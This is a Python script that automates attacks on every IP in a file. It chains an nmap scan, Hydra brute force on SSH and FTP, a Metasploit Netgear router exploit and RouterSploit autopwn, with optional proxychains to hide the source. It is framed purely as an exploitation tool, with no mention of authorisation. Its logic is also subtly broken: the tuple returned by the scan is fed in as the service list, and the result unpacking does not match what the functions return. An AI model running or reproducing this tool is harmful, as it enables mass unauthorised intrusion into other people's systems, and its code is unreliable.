import logging
import subprocess
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import shutil
import os

# Configure logging for detailed output
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

# Tool definitions with RouterSploit autopwn included
tool_patterns = {
    "nmap": {
        "command": ["nmap", "-Pn", "-sV", "{ip}"],
        "service": None,
        "description": "Nmap version scan to detect open services and versions."
    },
    "hydra_ssh": {
        "command": ["hydra", "-L", "/usr/share/wordlists/rockyou.txt", "-P", "/usr/share/wordlists/rockyou.txt", "ssh://{ip}"],
        "service": "ssh",
        "description": "Hydra brute-force attack against SSH."
    },
    "hydra_ftp": {
        "command": ["hydra", "-L", "/usr/share/wordlists/rockyou.txt", "-P", "/usr/share/wordlists/rockyou.txt", "ftp://{ip}"],
        "service": "ftp",
        "description": "Hydra brute-force attack against FTP."
    },
    "msfconsole": {
        "command": ["msfconsole", "-q", "-x", "use exploit/linux/http/netgear_dgn1000_setup_exec; set RHOSTS {ip}; exploit; exit"],
        "service": "http",
        "description": "Metasploit exploit for HTTP services on Netgear DGN1000."
    },
    "routersploit": {
        "command": ["routersploit", "autopwn", "-t", "{ip}"],
        "service": None,
        "description": "RouterSploit autopwn scan to attempt exploitation of vulnerable services."
    }
}

def load_ips(file_path="ips.txt"):
    """Load target IPs from a text file."""
    with open(file_path, "r") as file:
        return [line.strip() for line in file if line.strip()]

def execute_command(command, use_proxy=False):
    """Execute a command and return output, with optional proxychains."""
    if use_proxy:
        command = ["proxychains", "-q"] + command
    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=300)
        return result.stdout if result.returncode == 0 else result.stderr
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Command error: {e}"

def detect_installed_tools():
    """Detect available tools and return usable ones."""
    installed_tools = {}
    for tool, data in tool_patterns.items():
        if shutil.which(tool):
            installed_tools[tool] = data
    return installed_tools

def discover_services(ip, use_proxy=False):
    """Run Nmap discovery and return detected services and outdated ones."""
    logging.info(f"Running Nmap discovery on {ip} {'with proxy' if use_proxy else ''}")
    nmap_command = ["nmap", "-sV", "-Pn", "-p22,80,443,445,3389,3306,5432,1433,1521,5900,8080,8443", ip]
    output = execute_command(nmap_command, use_proxy)
    
    services = []
    outdated_services = []

    for line in output.splitlines():
        if "open" in line:
            if "ssh" in line:
                services.append("ssh")
            elif "http" in line:
                services.append("http")
            elif "ftp" in line:
                services.append("ftp")
        if "obsolete" in line.lower() or "outdated" in line.lower():
            outdated_services.append(line.strip())
    
    # Save Nmap output to file for each IP
    save_output(ip, output, "nmap_discovery")
    
    logging.info(f"Discovered services on {ip}: {services}")
    return services, outdated_services

def save_output(ip, output, scan_type):
    """Save output of each scan to a file with IP and scan type in the filename."""
    directory = "scan_outputs"
    os.makedirs(directory, exist_ok=True)
    filename = os.path.join(directory, f"{ip}_{scan_type}.log")
    with open(filename, "w") as file:
        file.write(output)
    logging.info(f"Saved {scan_type} output for {ip} to {filename}")

def run_exploit(ip, tool, tool_info, use_proxy=False):
    """Run a single exploit command for a tool with optional proxy support and return results."""
    command = [arg.replace("{ip}", ip) if "{ip}" in arg else arg for arg in tool_info["command"]]
    output = execute_command(command, use_proxy)
    save_output(ip, output, tool)
    
    success = "success" if "session opened" in output.lower() or "completed" in output.lower() else "failure"
    logging.info(f"{tool} on {ip} - {success}")
    
    return {
        "ip": ip,
        "tool": tool,
        "description": tool_info["description"],
        "status": success,
        "output": output
    }

def run_exploits_for_services(ip, services, available_tools, use_proxy=False):
    """Run relevant exploits based on services for an IP, with optional proxy support."""
    results = []
    for service in services:
        for tool, tool_info in available_tools.items():
            if tool_info["service"] is None or tool_info["service"] == service:
                result = run_exploit(ip, tool, tool_info, use_proxy)
                results.append(result)
    return results

def run_exploits_on_all_ips(target_ips, output_file="exploit_results.json", outdated_file="outdated_services.json", use_proxy=False):
    """Run exploits on all IPs with optional proxychains, save results, and log output."""
    all_results = []
    outdated_results = []
    available_tools = detect_installed_tools()
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(run_exploits_for_services, ip, discover_services(ip, use_proxy), available_tools, use_proxy): ip for ip in target_ips}
        
        for future in as_completed(futures):
            ip = futures[future]
            try:
                results, outdated_services = future.result()
                all_results.extend(results)
                if outdated_services:
                    outdated_results.append({"ip": ip, "outdated_services": outdated_services})
            except Exception as e:
                logging.error(f"Error processing {ip}: {e}")

    # Save all results to JSON files
    with open(output_file, "w") as f:
        json.dump(all_results, f, indent=4)
    with open(outdated_file, "w") as f:
        json.dump(outdated_results, f, indent=4)

    logging.info(f"All exploits completed. Results saved to {output_file}")
    logging.info(f"Outdated services saved to {outdated_file}")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Run exploits on a list of target IPs with optional proxychains support.")
    parser.add_argument("--proxy", action="store_true", help="Enable proxychains for exploit commands.")
    parser.add_argument("--proxy-file", type=str, default="proxies.txt", help="Path to file containing list of proxies.")
    args = parser.parse_args()

    # Load IPs from a file
    target_ips = load_ips("ips.txt")

    # Run exploits on all IPs
    run_exploits_on_all_ips(target_ips, use_proxy=args.proxy)
